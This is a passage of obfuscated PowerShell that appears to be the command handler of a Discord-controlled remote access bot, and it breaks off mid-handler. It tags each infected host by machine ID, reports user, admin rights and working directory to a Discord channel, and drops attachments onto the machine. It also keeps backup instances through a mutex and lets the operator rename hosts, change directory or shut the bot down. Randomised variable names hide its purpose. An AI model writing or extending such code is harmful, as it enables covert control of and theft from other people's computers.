        } else {
            if ($ZFZ3q -match '^(hi|hello|chao|hey)$') { Send-DiscordMessage -Content "hi $F8INmfY" -ReplyToId $msgId; return }
            if ($eITC67 -and $y9GRg3.Target -eq 'me') {
                $AD04G = Download-DiscordAttachment -Message $Message
                if ($AD04G.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($AD04G | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
            }
            return
        }
        if (-not $bdUegpN -and -not $eITC67) { return }
        if ($bdUegpN -match '^(\S+)\s*([\s\S]*)$') { $name = $Matches[1].ToLower(); $BktMd = $Matches[2] }
        else { $name = $bdUegpN.ToLower(); $BktMd = "" }
        $PKZpT = Get-Date -Format 'HH:mm:ss'
        [void]$script:history.Add("[$PKZpT] ${F8INmfY}: $bdUegpN")
        while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }

        switch ($name) {
            "help"  { Send-DiscordMessage -Content $IBzwDT9 -ReplyToId $msgId; return }
            "ping"  { Send-DiscordMessage -Content "pong" -ReplyToId $msgId; return }
            "id"    { Send-DiscordMessage -Content "ID: ``$($script:machineId)```nName: ``$($script:pcName)```nHost: ``$($script:hostname)```nInstance: #$($script:instanceId) ($(if($script:isActive){'ACTIVE'}else{'BACKUP'}))`nPID: $($script:myPid)" -ReplyToId $msgId; return }
            "instance" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`nMutex: ``$($script:mutexName)``" -ReplyToId $msgId; return }
            "instances" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | $(if($script:isActive){'ACTIVE'}else{'BACKUP'})" -ReplyToId $msgId; return }
            "getpc" { Send-DiscordMessage -Content "PC: **$($script:pcName)** ``$($script:machineId)```nHost: ``$($script:hostname)```nSet: $(if($script:isSet){'yes'}else{'no'})" -ReplyToId $msgId; return }
            "setpc" {
                if (-not $BktMd) { Send-DiscordMessage -Content "usage: !setpc <name>" -ReplyToId $msgId; return }
                $XfeP = ($BktMd.Trim() -split '\s+')[0]
                $script:pcName = $XfeP; $script:isSet = $true
                $script:tag = "[$($script:pcName):$($script:machineId)]"
                Save-Config @{ name = $XfeP; id = $script:machineId; host = $script:hostname }
                Send-DiscordMessage -Content "Ten: **$XfeP**" -ReplyToId $msgId; return
            }
            "whoami"{ Send-DiscordMessage -Content "``$env:USERDOMAIN\$env:USERNAME`` admin=$(if(Test-Admin){'Y'}else{'N'})" -ReplyToId $msgId; return }
            "bot_info" {
                $E3MmCtUD = (Get-Date) - $script:startTime
                $RaOc9j  = "**$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | v8.7`n"
                $RaOc9j += "up $([math]::Floor($E3MmCtUD.TotalHours))h$($E3MmCtUD.Minutes)m | admin: $(if(Test-Admin){'Y'}else{'N'})`n"
                $RaOc9j += "Status: **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`n"
                $RaOc9j += "cwd ``$($script:workDir)``"
                Send-DiscordMessage -Content $RaOc9j -ReplyToId $msgId; return
            }
            "uptime" { $E3MmCtUD=(Get-Date)-$script:startTime; Send-DiscordMessage -Content "up $([math]::Floor($E3MmCtUD.TotalHours))h$($E3MmCtUD.Minutes)m" -ReplyToId $msgId; return }
            "shutdown" { Send-DiscordMessage -Content "bot off" -ReplyToId $msgId; Start-Sleep 1; $script:running = $false; return }
            "history" { if ($script:history.Count -eq 0) { Send-DiscordMessage -Content "empty" -ReplyToId $msgId; return }; Send-CodeBlock -Title "history" -Body (($script:history | Select-Object -Last 20) -join "`n") -ReplyToId $msgId; return }
            "clearhist" { $script:history.Clear(); Send-DiscordMessage -Content "cleared" -ReplyToId $msgId; return }
            "cwd" { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
            "cd" {
                if (-not $BktMd) { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
